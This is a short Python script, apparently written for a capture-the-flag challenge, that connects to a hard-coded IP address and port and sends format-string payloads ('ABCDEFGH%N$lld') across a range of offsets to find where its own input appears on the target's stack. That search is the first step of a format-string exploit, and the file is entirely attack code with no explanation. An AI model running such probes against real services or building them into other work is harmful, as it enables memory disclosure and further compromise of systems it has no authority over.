#!/usr/bin/env python3
import socket, time, re
HOST="144.79.188.39"; PORT=43642
s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300)
def ask(fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.06)
    try: return s.recv(4096)
    except Exception: return b'<T>'
# pattern bytes "ABCDEFGH" -> little endian u64 = 0x4847464544434241
want = 0x4847464544434241
for N in range(6, 46):
    d = ask(b"ABCDEFGH" + b"%%%d$lld" % N)
    m = re.search(rb'([0-9-]+)\n', d)
    if m:
        v = int(m.group(1))
        if v & ((1<<64)-1) == want:
            print(f"N={N} MATCHES pattern!")
        else:
            # also print if it looks like buffer-derived
            pass
    else:
        pass
# print a compact report for the ones that look interesting
print("scan done; re-running to report all values for 6..40")
for N in range(6, 41):
    d = ask(b"ABCDEFGH" + b"%%%d$lld" % N)
    m = re.search(rb'([0-9-]+)\n', d)
    v = int(m.group(1)) if m else None
    print(N, hex(v & ((1<<64)-1)) if v is not None else repr(d))
s.close()
